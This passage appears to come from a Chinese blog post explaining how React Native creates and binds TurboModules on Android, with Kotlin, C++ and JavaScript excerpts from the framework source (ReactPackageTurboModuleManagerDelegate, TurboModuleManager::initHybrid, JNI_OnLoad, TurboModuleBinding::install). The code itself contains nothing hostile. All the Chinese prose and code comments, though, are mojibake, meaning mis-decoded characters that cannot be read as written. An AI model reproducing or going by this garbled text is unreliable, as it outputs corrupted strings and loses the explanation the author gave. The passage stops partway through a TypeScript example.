<p>é‚£ä¹ˆ<code>delegate?.getEagerInitModuleNames()</code>è°ƒç”¨ä¸­çš„<code>delegate</code>å®é™…ä¸Šå°±æ˜¯<code>DefaultTurboModuleManagerDelegate</code>ã€‚ä½†è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œ<code>delegate.turboModuleManagerDelegateBuilder.setPackages(reactPackages).setReactApplicationContext(context).build()</code>å®é™…ä¸Šè°ƒç”¨çš„æ˜¯çˆ¶ç±»ä¸­çš„ä¸å¸¦å‚æ•°çš„<code>build</code>æ–¹æ³•<code>react-native/packages/react-native/ReactAndroid/src/main/java/com/facebook/react/ReactPackageTurboModuleManagerDelegate.kt</code>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: ReactPackageTurboModuleManagerDelegate {
      <span class="hljs-keyword">val</span> nonNullContext =
          requireNotNull(context) {
            <span class="hljs-string">"The ReactApplicationContext must be provided to create ReactPackageTurboModuleManagerDelegate"</span>
          }
      <span class="hljs-keyword">val</span> nonNullPackages =
          requireNotNull(packages) {
            <span class="hljs-string">"A set of ReactPackages must be provided to create ReactPackageTurboModuleManagerDelegate"</span>
          }
      <span class="hljs-keyword">return</span> build(nonNullContext, nonNullPackages)
    }
</code></pre>
<p>ç”±çˆ¶ç±»çš„<code>build</code>å†è°ƒç”¨å…¶å­ç±»å®ç°çš„å¸¦ä¸¤ä¸ªå‚æ•°çš„<code>build</code>æ–¹æ³•ã€‚æ‰€ä»¥<code>DefaultTurboModuleManagerDelegate</code>æ„é€ æ—¶ä¼ å…¥çš„<code>packages</code>å®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬å‰é¢åœ¨<code>ReactInstance</code>ä¸­åˆ†æçš„<code>reactPackages</code>ã€‚</p>
<p>ä½†<code>DefaultTurboModuleManagerDelegate</code>å®é™…ä¸Šæ²¡å®ç°<code>getEagerInitModuleNames</code>ï¼Œæˆ‘ä»¬æ¥çœ‹çˆ¶ç±»çš„å®ç°ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ReactPackageTurboModuleManagerDelegate.kt</span>

  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">constructor</span>(
      reactApplicationContext: ReactApplicationContext,
      packages: List&lt;ReactPackage&gt;,
      hybridData: HybridData,
  ) : <span class="hljs-keyword">super</span>(hybridData) {
    initialize(reactApplicationContext, packages)
  }

  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getEagerInitModuleNames</span><span class="hljs-params">()</span></span>: List&lt;String&gt; = buildList {
    <span class="hljs-keyword">for</span> (moduleProvider <span class="hljs-keyword">in</span> moduleProviders) {
      <span class="hljs-keyword">for</span> (moduleInfo <span class="hljs-keyword">in</span> packageModuleInfos[moduleProvider]?.values ?: emptyList()) {
        <span class="hljs-keyword">if</span> (moduleInfo.isTurboModule &amp;&amp; moduleInfo.needsEagerInit) {
          add(moduleInfo.name)
        }
      }
    }
  }

  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">initialize</span><span class="hljs-params">(
        reactApplicationContext: <span class="hljs-type">ReactApplicationContext</span>,
        packages: <span class="hljs-type">List</span>&lt;<span class="hljs-type">ReactPackage</span>&gt;,
    )</span></span> {
      <span class="hljs-keyword">val</span> applicationContext: ReactApplicationContext = reactApplicationContext
      <span class="hljs-keyword">for</span> (reactPackage <span class="hljs-keyword">in</span> packages) {
       <span class="hljs-comment">/**
         * BaseReactPackageï¼ˆæ–°æ¶æ„ï¼Œæ¨èæ–¹å¼ï¼‰
         * 
         * BaseReactPackage æ˜¯ä¸“ä¸ºæ–°æ¶æ„è®¾è®¡çš„æŠ½è±¡ç±»ï¼Œç‰¹ç‚¹ï¼š
         * - æ”¯æŒæ‡’åŠ è½½ï¼šæ¨¡å—åªåœ¨éœ€è¦æ—¶æ‰åˆ›å»ºï¼ˆé€šè¿‡ getModule(name)ï¼‰
         * - æä¾›æ¨¡å—å…ƒä¿¡æ¯ï¼šé€šè¿‡ getReactModuleInfoProvider() è·å–é¢„å®šä¹‰çš„æ¨¡å—ä¿¡æ¯
         * - æ€§èƒ½ä¼˜åŒ–ï¼šé¿å…å¯åŠ¨æ—¶åˆ›å»ºæ‰€æœ‰æ¨¡å—ï¼Œå‡å°‘å†…å­˜å ç”¨å’Œå¯åŠ¨æ—¶é—´
         */</span>
        <span class="hljs-keyword">if</span> (reactPackage <span class="hljs-keyword">is</span> BaseReactPackage) {
          <span class="hljs-keyword">val</span> moduleProvider = ModuleProvider { moduleName: String -&gt;
            reactPackage.getModule(moduleName, applicationContext)
          }
          moduleProviders.add(moduleProvider)
          packageModuleInfos[moduleProvider] =
              reactPackage.getReactModuleInfoProvider().getReactModuleInfos()
          <span class="hljs-keyword">continue</span>
        }
                <span class="hljs-comment">// çœç•¥è¿‡æ—¶çš„æ—§æ¶æ„ä»£ç ......</span>
      }
    }
</code></pre>
<p>é€šè¿‡å¯¹ä»¥ä¸Šä»£ç åˆ†æï¼Œæµç¨‹å°±å¾ˆæ¸…æ™°äº†ã€‚å®ƒåœ¨<code>ReactPackageTurboModuleManagerDelegate</code>çš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨<code>initialize</code>æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ã€‚</p>
<p><strong>æ ¸å¿ƒèŒè´£</strong>æ˜¯ï¼š</p>
<ul>
<li>éå†æ‰€æœ‰ ReactPackageï¼Œä¸ºæ¯ä¸ªåŒ…åˆ›å»º ModuleProviderï¼ˆæ¨¡å—æä¾›è€…ï¼‰ï¼Œç”¨äºæŒ‰éœ€åˆ›å»º NativeModule</li>
<li>æ”¶é›†å¹¶ç¼“å­˜æ‰€æœ‰æ¨¡å—çš„å…ƒä¿¡æ¯ï¼ˆReactModuleInfoï¼‰ï¼ŒåŒ…æ‹¬æ¨¡å—åã€ç±»å‹ã€æ˜¯å¦ TurboModule ç­‰</li>
</ul>
<p>åˆå§‹åŒ–å®Œæˆåï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„<code>getEagerInitModuleNames</code>è°ƒç”¨å°±å¾ˆå¥½ç†è§£ï¼Œä¸»è¦å°±æ˜¯è¿”å›æ‰€æœ‰æ ‡è®°ä¸º <code>needsEagerInit = true</code> çš„ TurboModule æ¨¡å—ååˆ—è¡¨ï¼Œè¿™äº›æ¨¡å—ä¼šåœ¨ ReactInstance åˆå§‹åŒ–åç«‹å³åˆ›å»ºï¼Œè€Œä¸æ˜¯ç­‰åˆ°é¦–æ¬¡ä½¿ç”¨æ—¶æ‰åˆ›å»ºã€‚</p>
<p>ä¹‹æ‰€ä»¥éœ€è¦é¢„åŠ è½½ï¼Œæ˜¯å› ä¸ºæŸäº›æ¨¡å—å¿…é¡»åœ¨åº”ç”¨å¯åŠ¨æ—¶ç«‹å³åˆå§‹åŒ–ï¼Œä»è€Œé¿å…é¦–æ¬¡ä½¿ç”¨æ—¶åˆ›å»ºæ¨¡å—å¯¼è‡´çš„å»¶è¿Ÿå’Œå¡é¡¿ï¼ŒåŒæ—¶ç¡®ä¿å…³é”®åŸºç¡€è®¾æ–½æ¨¡å—åœ¨ JS bundle åŠ è½½å‰å°±å‡†å¤‡å¥½ã€‚</p>
<h5 data-id="heading-4">C++ ä¾§çš„åˆå§‹åŒ–</h5>
<p>ç°åœ¨æˆ‘ä»¬æ¥åˆ†æ<code>TurboModuleManager</code>ä¸­çš„Nativeæ–¹æ³•<code>initHybrid</code>ã€‚é¦–å…ˆè¯¥ç±»åŠ è½½çš„åŠ¨æ€åº“æ˜¯<code>SoLoader.loadLibrary("turbomodulejsijni")</code>ï¼Œæ‰€ä»¥å¯¹åº”çš„JNIå®ç°ï¼Œè‚¯å®šä½äº<code>turbomodulejsijni</code>åº“ä¸­ï¼Œå…¶æ¬¡ä¸Šå±‚Kotlinç±»å’ŒNativeå±‚C++ç±»æ˜¯ä¸€ç§æ˜ å°„å…³ç³»ï¼Œæ‰€ä»¥C++ä¸­ä¹Ÿåº”è¯¥æœ‰ä¸€ä¸ªå¯¹åº”ç±»å«<code>TurboModuleManager</code>,è¿™ä¹Ÿæ˜¯æˆ‘ä»¬åœ¨å¯åŠ¨æµç¨‹é‡Œé¢åˆ†æè¿‡çš„ï¼Œä½¿ç”¨<strong>fbjni</strong>çš„åŸå› ã€‚æ ¹æ®è¿™ä¸¤ä¸ªæ¡ä»¶ï¼Œå°±èƒ½å‡†ç¡®å®šä½åˆ°æ­¤å¤„<code>initHybrid</code>çš„å…·ä½“å®ç°ï¼ˆæ³¨æ„ï¼Œå…¨å±€æœç´¢<code>initHybrid</code>ä¼šå‘ç°æœ‰å¾ˆå¤šåŒåæ–¹æ³•çš„ï¼‰ã€‚</p>
<p>å¤´æ–‡ä»¶æºç <code>react-native/packages/react-native/ReactAndroid/src/main/jni/react/turbomodule/ReactCommon/TurboModuleManager.h</code></p>
<pre><code class="hljs language-c++" lang="c++">  <span class="hljs-function"><span class="hljs-type">static</span> jni::local_ref&lt;jhybriddata&gt; <span class="hljs-title">initHybrid</span><span class="hljs-params">(
      jni::alias_ref&lt;jhybridobject&gt; <span class="hljs-comment">/* unused */</span>,
      jni::alias_ref&lt;JRuntimeExecutor::javaobject&gt; runtimeExecutor,
      jni::alias_ref&lt;CallInvokerHolder::javaobject&gt; jsCallInvokerHolder,
      jni::alias_ref&lt;NativeMethodCallInvokerHolder::javaobject&gt; nativeMethodCallInvokerHolder,
      jni::alias_ref&lt;TurboModuleManagerDelegate::javaobject&gt; delegate)</span></span>;
</code></pre>
<p>CPPæºç <code>react-native/packages/react-native/ReactAndroid/src/main/jni/react/turbomodule/ReactCommon/TurboModuleManager.cpp</code></p>
<pre><code class="hljs language-c++" lang="c++">TurboModuleManager::<span class="hljs-built_in">TurboModuleManager</span>(
    RuntimeExecutor runtimeExecutor,
    std::shared_ptr&lt;CallInvoker&gt; jsCallInvoker,
    std::shared_ptr&lt;NativeMethodCallInvoker&gt; nativeMethodCallInvoker,
    jni::alias_ref&lt;TurboModuleManagerDelegate::javaobject&gt; delegate)
    : <span class="hljs-built_in">runtimeExecutor_</span>(std::<span class="hljs-built_in">move</span>(runtimeExecutor)),
      <span class="hljs-built_in">jsCallInvoker_</span>(std::<span class="hljs-built_in">move</span>(jsCallInvoker)),
      <span class="hljs-built_in">nativeMethodCallInvoker_</span>(std::<span class="hljs-built_in">move</span>(nativeMethodCallInvoker)),
      <span class="hljs-built_in">delegate_</span>(jni::<span class="hljs-built_in">make_global</span>(delegate)) {}

<span class="hljs-function">jni::local_ref&lt;TurboModuleManager::jhybriddata&gt; <span class="hljs-title">TurboModuleManager::initHybrid</span><span class="hljs-params">(
    jni::alias_ref&lt;jhybridobject&gt; <span class="hljs-comment">/* unused */</span>,
    jni::alias_ref&lt;JRuntimeExecutor::javaobject&gt; runtimeExecutor,
    jni::alias_ref&lt;CallInvokerHolder::javaobject&gt; jsCallInvokerHolder,
    jni::alias_ref&lt;NativeMethodCallInvokerHolder::javaobject&gt;
        nativeMethodCallInvokerHolder,
    jni::alias_ref&lt;TurboModuleManagerDelegate::javaobject&gt; delegate)</span> </span>{
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">makeCxxInstance</span>(
      runtimeExecutor-&gt;<span class="hljs-built_in">cthis</span>()-&gt;<span class="hljs-built_in">get</span>(),
      jsCallInvokerHolder-&gt;<span class="hljs-built_in">cthis</span>()-&gt;<span class="hljs-built_in">getCallInvoker</span>(),
      nativeMethodCallInvokerHolder-&gt;<span class="hljs-built_in">cthis</span>()-&gt;<span class="hljs-built_in">getNativeMethodCallInvoker</span>(),
      delegate);
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TurboModuleManager::registerNatives</span><span class="hljs-params">()</span> </span>{
  <span class="hljs-built_in">registerHybrid</span>({
      <span class="hljs-built_in">makeNativeMethod</span>(<span class="hljs-string">"initHybrid"</span>, TurboModuleManager::initHybrid),
      <span class="hljs-built_in">makeNativeMethod</span>(
          <span class="hljs-string">"installJSIBindings"</span>, TurboModuleManager::installJSIBindings),
  });
}
</code></pre>
<p>è¿™é‡Œå¤§é‡ä½¿ç”¨äº†<strong>fbjni</strong>æä¾›çš„æœºåˆ¶ï¼Œè¿™å¯¹äºç†Ÿæ‚‰å’Œä¸ç†Ÿæ‚‰JVM JNIæœºåˆ¶çš„äººéƒ½ä¼šé€ æˆä¸€å®šç¨‹åº¦æ··ä¹±ã€‚é¦–å…ˆæˆ‘ä»¬ç†ä¸€ç†è°ƒç”¨çš„æµç¨‹ï¼Œæ ¹æ®JNIçš„æœºåˆ¶ï¼Œå½“åœ¨Javaç±»ä¸­åŠ è½½åŠ¨æ€åº“æ—¶ï¼Œå…¶åŠ¨æ€åº“ä¸­çš„<code>JNI_OnLoad</code>å°±ä¼šè¢«è°ƒç”¨ã€‚è¿™é‡Œæœ‰ä¸€ä»½è°·æ­Œå®˜æ–¹æ–‡æ¡£ï¼Œè¯¦ç»†ä»‹ç»äº†<code>JNI_OnLoad</code>æ–¹æ³•çš„ä½¿ç”¨ï¼ŒåŒ…æ‹¬å¦‚ä½•æ³¨å†ŒNativeæ–¹æ³•åç­‰ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fndk%2Fguides%2Fjni-tips%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/ndk/guides/jni-tips?hl=zh-cn" ref="nofollow noopener noreferrer">JNI æ–‡æ¡£</a>ã€‚ç°åœ¨çœ‹åˆ°<code>react-native/packages/react-native/ReactAndroid/src/main/jni/react/turbomodule/ReactCommon/OnLoad.cpp</code></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">JNIEXPORT jint JNICALL <span class="hljs-title">JNI_OnLoad</span><span class="hljs-params">(JavaVM* vm, <span class="hljs-type">void</span>* <span class="hljs-comment">/*unused*/</span>)</span> </span>{
  <span class="hljs-keyword">return</span> facebook::jni::<span class="hljs-built_in">initialize</span>(vm, [] {
    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> dvacca ramanpreet unify this with the way</span>
    <span class="hljs-comment">// "ComponentDescriptorFactory" is defined in Fabric</span>
    facebook::react::TurboModuleManager::<span class="hljs-built_in">registerNatives</span>();

    facebook::jni::<span class="hljs-built_in">registerNatives</span>(
        <span class="hljs-string">"com/facebook/react/internal/turbomodule/core/TurboModulePerfLogger"</span>,
        {<span class="hljs-built_in">makeNativeMethod</span>(<span class="hljs-string">"jniEnableCppLogging"</span>, jniEnableCppLogging)});
  });
}
</code></pre>
<p>ç°åœ¨æµç¨‹å°±å¾ˆæ¸…æ™°äº†ï¼Œå½“kotlinä¸­<code>SoLoader.loadLibrary("turbomodulejsijni")</code>åŠ è½½æ—¶ï¼Œ<code>JNI_OnLoad</code>è¢«è°ƒç”¨ï¼Œ<code>TurboModuleManager</code>ä¸­çš„é™æ€å‡½æ•°<code>registerNatives</code>è¢«è°ƒç”¨ï¼Œæ³¨å†Œäº†ä¸€ä¸ªNativeæ–¹æ³•<code>initHybrid</code>ï¼Œå¹¶å°†å…¶ä¸<code>TurboModuleManager</code>çš„é™æ€æ–¹æ³•<code>initHybrid</code>è¿›è¡Œæ˜ å°„ã€‚</p>
<p>ç°åœ¨ï¼Œå½“Kotlinä¸­çš„Nativeæ–¹æ³•<code>initHybrid</code>è°ƒç”¨æ—¶ï¼Œå°±ä¼šè°ƒç”¨<code>TurboModuleManager</code>çš„é™æ€å‡½æ•°<code>initHybrid</code>ã€‚æ¥ä¸‹æ¥ï¼Œ<code>initHybrid</code>çš„å®ç°ä¸­ï¼Œè°ƒç”¨äº†<strong>fbjni</strong>æä¾›çš„<code>makeCxxInstance</code>å‡½æ•°ã€‚å…¶å†…éƒ¨å®ç°å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-c++" lang="c++">  <span class="hljs-function"><span class="hljs-type">static</span> local_ref&lt;detail::HybridData&gt; <span class="hljs-title">makeHybridData</span><span class="hljs-params">(
      std::unique_ptr&lt;T&gt; cxxPart)</span> </span>{
    <span class="hljs-keyword">auto</span> hybridData = detail::HybridData::<span class="hljs-built_in">create</span>();
    <span class="hljs-built_in">setNativePointer</span>(hybridData, std::<span class="hljs-built_in">move</span>(cxxPart));
    <span class="hljs-keyword">return</span> hybridData;
  }

  <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span>... Args&gt;
  <span class="hljs-function"><span class="hljs-type">static</span> local_ref&lt;detail::HybridData&gt; <span class="hljs-title">makeCxxInstance</span><span class="hljs-params">(Args&amp;&amp;... args)</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">makeHybridData</span>(
        std::<span class="hljs-built_in">unique_ptr</span>&lt;T&gt;(<span class="hljs-keyword">new</span> <span class="hljs-built_in">T</span>(std::forward&lt;Args&gt;(args)...)));
  }
</code></pre>
<p>è¿™æ˜¯ä¸¤ä¸ªæ¨¡ç‰ˆå‡½æ•°ã€‚å…¶ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯åšäº†ä¸‰ä»¶äº‹ï¼š</p>
<ol>
<li>æ ¹æ®æ¨¡ç‰ˆç±»å‹åˆ›å»º C++ å¯¹è±¡</li>
<li>åˆ›å»º <code>HybridData</code> åŒ…è£…å™¨æ¥åŒ…è£… C++ å¯¹è±¡</li>
<li>è¿”å› JNI æœ¬åœ°å¼•ç”¨ã€‚<code>local_ref</code>å°±æ˜¯ä¸€ä¸ªæ™ºèƒ½æŒ‡é’ˆã€‚</li>
</ol>
<p>åˆ°è¿™é‡ŒC++çš„<code>initHybrid</code>å°±å¾ˆæ¸…æ¥šäº†ï¼Œä¸»è¦å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªC++çš„<code>TurboModuleManager</code>å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨äº† <code>HybridData</code> åŒ…è£…è¿”å›ã€‚</p>
<p>è¯¥æ–¹æ³•çš„å‡ ä¸ªå‚æ•°ï¼š</p>






























<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><strong>runtimeExecutor</strong></td><td><code>JRuntimeExecutor</code></td><td>åœ¨ JS çº¿ç¨‹ä¸Šæ‰§è¡Œä»£ç çš„æ‰§è¡Œå™¨</td></tr><tr><td><strong>jsCallInvokerHolder</strong></td><td><code>CallInvokerHolder</code></td><td>æŒæœ‰ä» C++ è°ƒç”¨ JS çš„è°ƒç”¨å™¨</td></tr><tr><td><strong>nativeMethodCallInvokerHolder</strong></td><td><code>NativeMethodCallInvokerHolder</code></td><td>æŒæœ‰ä» JS è°ƒç”¨ Native çš„è°ƒç”¨å™¨</td></tr><tr><td><strong>delegate</strong></td><td><code>TurboModuleManagerDelegate</code></td><td>æä¾› TurboModule å®ä¾‹çš„å§”æ‰˜å¯¹è±¡</td></tr></tbody></table>
<p>æ¥ä¸‹æ¥åœ¨Kotlinä¸­è°ƒç”¨çš„<code>installJSIBindings</code>æ–¹æ³•ï¼Œè‡ªç„¶ä¹Ÿæ˜¯å¯¹åº”åˆ°C++ç±»ä¸­çš„é™æ€å‡½æ•°ï¼š</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-comment">// TurboModuleManager.cpp </span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TurboModuleManager::installJSIBindings</span><span class="hljs-params">(
    jni::alias_ref&lt;jhybridobject&gt; javaPart,      <span class="hljs-comment">// â† Java ç«¯ TurboModuleManager å¯¹è±¡å¼•ç”¨</span>
    <span class="hljs-type">bool</span> shouldCreateLegacyModules)</span> </span>{            <span class="hljs-comment">// â† æ˜¯å¦åˆ›å»ºæ—§æ¶æ„æ¨¡å—çš„æ ‡å¿—</span>
  <span class="hljs-keyword">auto</span> cxxPart = javaPart-&gt;<span class="hljs-built_in">cthis</span>();              <span class="hljs-comment">// â† è·å– C++ ç«¯å¯¹è±¡æŒ‡é’ˆ</span>
  <span class="hljs-keyword">if</span> (cxxPart == <span class="hljs-literal">nullptr</span> || !cxxPart-&gt;jsCallInvoker_) {
    <span class="hljs-keyword">return</span>; <span class="hljs-comment">// è¿æ¥åˆ° Chrome è°ƒè¯•å™¨æ—¶ï¼Œè¿è¡Œæ—¶ä¸å­˜åœ¨ã€‚</span>
  }

  cxxPart-&gt;<span class="hljs-built_in">runtimeExecutor_</span>([javaPart = jni::<span class="hljs-built_in">make_global</span>(javaPart),
                             shouldCreateLegacyModules](jsi::Runtime&amp; runtime) {
    <span class="hljs-comment">// æ³¨æ„ï¼Œæ­¤ lambdaä¸­å·²ç»çº¿ç¨‹åˆ‡æ¢äº†ï¼Œ æ˜¯åœ¨ JS çº¿ç¨‹ä¸Šæ‰§è¡Œçš„</span>
    TurboModuleBinding::<span class="hljs-built_in">install</span>(                 <span class="hljs-comment">// â† åœ¨ JS Runtime ä¸­å®‰è£…ç»‘å®š</span>
        runtime,
        <span class="hljs-built_in">createTurboModuleProvider</span>(javaPart, &amp;runtime),
        shouldCreateLegacyModules ? <span class="hljs-built_in">createLegacyModuleProvider</span>(javaPart)
                                  : <span class="hljs-literal">nullptr</span>);
  });
}

<span class="hljs-function">TurboModuleProviderFunctionType <span class="hljs-title">TurboModuleManager::createTurboModuleProvider</span><span class="hljs-params">(
    jni::alias_ref&lt;jhybridobject&gt; javaPart,
    jsi::Runtime* runtime)</span> </span>{
  <span class="hljs-keyword">return</span> [runtime, weakJavaPart = jni::<span class="hljs-built_in">make_weak</span>(javaPart)](
             <span class="hljs-type">const</span> std::string&amp; name) -&gt; std::shared_ptr&lt;TurboModule&gt; {
    <span class="hljs-keyword">auto</span> javaPart = weakJavaPart.<span class="hljs-built_in">lockLocal</span>();      <span class="hljs-comment">// â† å°è¯•è·å–å¼ºå¼•ç”¨</span>
    <span class="hljs-keyword">if</span> (!javaPart) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;                              <span class="hljs-comment">// â† Java å¯¹è±¡å·²è¢«å›æ”¶</span>
    }

    <span class="hljs-keyword">auto</span> cxxPart = javaPart-&gt;<span class="hljs-built_in">cthis</span>();
    <span class="hljs-keyword">if</span> (cxxPart == <span class="hljs-literal">nullptr</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;                              <span class="hljs-comment">// â† C++ å¯¹è±¡å·²è¢«é”€æ¯</span>
    }

    <span class="hljs-keyword">return</span> cxxPart-&gt;<span class="hljs-built_in">getTurboModule</span>(javaPart, name, *runtime); <span class="hljs-comment">// â† è·å–æ¨¡å—å®ä¾‹</span>
  };
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>createTurboModuleProvider</code>æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªé—­åŒ…ï¼Œä¹Ÿå°±æ˜¯C++ä¸­çš„lambdaå‡½æ•°ã€‚æ­¤é—­åŒ…çš„è¿”å›å€¼æ˜¯<code>TurboModule</code>ç±»å‹ï¼Œå¯è§ï¼Œå¦‚ä½•æŸ¥æ‰¾è°ƒç”¨TurboModuleçš„æ ¸å¿ƒé€»è¾‘ï¼Œè‚¯å®šå°±åœ¨<code>cxxPart-&gt;getTurboModule(javaPart, name, *runtime)</code>è¿™è¡Œï¼Œè¿™é‡Œçš„<code>getTurboModule</code>æ–¹æ³•ï¼Œå°±æ˜¯å½“å‰C++ <code>TurboModuleManager</code>å¯¹è±¡ä¸­çš„æ–¹æ³•ã€‚æ­¤å¤„æˆ‘ä»¬æš‚æ—¶ç•¥è¿‡ï¼Œæ”¾åˆ°ä¸‹ä¸€èŠ‚<strong>TurboModule è°ƒç”¨æµç¨‹</strong>è¯¦ç»†åˆ†æã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬åº”è¯¥çœ‹çœ‹<code>TurboModuleBinding::install</code>å‡½æ•°åšäº†ä»€ä¹ˆã€‚</p>
<p>æºç <code>react-native/packages/react-native/ReactCommon/react/nativemodule/core/ReactCommon/TurboModuleBinding.cpp</code></p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TurboModuleBinding::install</span><span class="hljs-params">(
    jsi::Runtime&amp; runtime,
    TurboModuleProviderFunctionType&amp;&amp; moduleProvider,
    TurboModuleProviderFunctionType&amp;&amp; legacyModuleProvider,
    std::shared_ptr&lt;LongLivedObjectCollection&gt; longLivedObjectCollection)</span> </span>{
  <span class="hljs-comment">// TODO(T208105802): We can get this information from the native side!</span>
  <span class="hljs-keyword">auto</span> isBridgeless = runtime.<span class="hljs-built_in">global</span>().<span class="hljs-built_in">hasProperty</span>(runtime, <span class="hljs-string">"RN$Bridgeless"</span>);

  <span class="hljs-keyword">if</span> (!isBridgeless) {
    runtime.<span class="hljs-built_in">global</span>().<span class="hljs-built_in">setProperty</span>(
    runtime,
    <span class="hljs-string">"__turboModuleProxy"</span>,
    <span class="hljs-comment">// æ—§æ¶æ„çœç•¥......</span>
    );
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-comment">// æ–°æ¶æ„ï¼ˆBridgeless æ¨¡å¼ï¼‰ï¼Œå®‰è£… nativeModuleProxy HostObject</span>
  <span class="hljs-built_in">defineReadOnlyGlobal</span>(
      runtime,
      <span class="hljs-string">"nativeModuleProxy"</span>,   <span class="hljs-comment">// â† å…¨å±€å¯¹è±¡å</span>
      jsi::Object::<span class="hljs-built_in">createFromHostObject</span>(
          runtime,
          std::<span class="hljs-built_in">make_shared</span>&lt;BridgelessNativeModuleProxy&gt;(
              runtime,
              std::<span class="hljs-built_in">move</span>(moduleProvider),
              std::<span class="hljs-built_in">move</span>(legacyModuleProvider),
              longLivedObjectCollection)));
}
</code></pre>
<p>æ­¤å¤„çš„<code>defineReadOnlyGlobal</code>å‡½æ•°å°±æ¶‰åŠåˆ°JSIæ¥å£è°ƒç”¨äº†ã€‚JSIä¹‹äºJS å¼•æ“ï¼Œå°±ç›¸å½“äºJNIä¹‹äºJVMã€‚JSIå°±æ˜¯æ‰“é€šä¸Šå±‚JSä»£ç ä¸åº•å±‚C++äº’ç›¸è°ƒç”¨çš„å¼•æ“æ¥å£æ¡†æ¶ã€‚å¯¹äºJSIæ¥å£çš„è¯¦ç»†åˆ†æï¼Œä¼šå†å•ç‹¬çš„ç¯‡ç« ä»‹ç»ã€‚è¿™é‡Œåªéœ€è¦çŸ¥é“ï¼Œæ­¤æ–¹æ³•åœ¨JSè¿è¡Œæ—¶å®šä¹‰äº†ä¸€ä¸ªåªè¯»å…¨å±€å±æ€§ï¼Œæ­¤æ–¹æ³•ç­‰ä»·äºä»¥ä¸‹JSä»£ç ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-variable language_">global</span>, propName, {
  <span class="hljs-attr">value</span>: value,
  <span class="hljs-attr">writable</span>: <span class="hljs-literal">false</span>,        <span class="hljs-comment">// â† ä¸å¯å†™ï¼ˆåªè¯»ï¼‰</span>
  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,      <span class="hljs-comment">// â† ä¸å¯æšä¸¾ï¼ˆéšè—ï¼‰</span>
  <span class="hljs-attr">configurable</span>: <span class="hljs-literal">false</span>     <span class="hljs-comment">// â† ä¸å¯é…ç½®ï¼ˆä¸å¯åˆ é™¤/ä¿®æ”¹æè¿°ç¬¦ï¼‰</span>
});
</code></pre>
<p>é‚£ä¹ˆè¿™é‡Œï¼Œå°±æ˜¯åœ¨JSå…¨å±€å®šä¹‰äº†ä¸€ä¸ªåªè¯»å…¨å±€å±æ€§<code>nativeModuleProxy</code>ï¼Œæ­¤å˜é‡çš„å†…éƒ¨ç±»å‹æ˜¯<code>BridgelessNativeModuleProxy</code>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸Šå±‚JSä½¿ç”¨<code>nativeModuleProxy</code>æ—¶ï¼Œå…¶å®å°±æ˜¯åœ¨è°ƒç”¨åº•å±‚C++çš„<code>BridgelessNativeModuleProxy</code>å¯¹è±¡ã€‚</p>
<p>æ€»çš„æ¥è¯´ï¼Œ<code>TurboModuleBinding::install</code>çš„ä½œç”¨å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ª<code>BridgelessNativeModuleProxy</code>å¯¹è±¡ï¼Œå…¶æŒæœ‰<code>moduleProvider</code>é—­åŒ…ï¼Œç„¶åæ³¨å†Œç»™ä¸Šå±‚JavaScriptä½¿ç”¨ã€‚æ­¤æ–¹æ³•æœ‰ä¸ªåœ°æ–¹éœ€è¦ç•™æ„ï¼Œåœ¨æ—§æ¶æ„æ—¶ï¼Œå…¶å®šä¹‰çš„å…¨å±€å¯¹è±¡æ˜¯<code>__turboModuleProxy</code>ã€‚</p>
<h3 data-id="heading-5">TurboModule è°ƒç”¨æµç¨‹</h3>
<p>å…ˆå›é¡¾ä¸€ä¸‹å®˜æ–¹ç»™å‡ºçš„ç¼–å†™TurboModuleçš„è§„èŒƒï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> {<span class="hljs-title class_">TurboModule</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">'react-native'</span>;
<span class="hljs-keyword">import</span> {<span class="hljs-title class_">TurboModuleRegistry</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">'react-native'</span>;

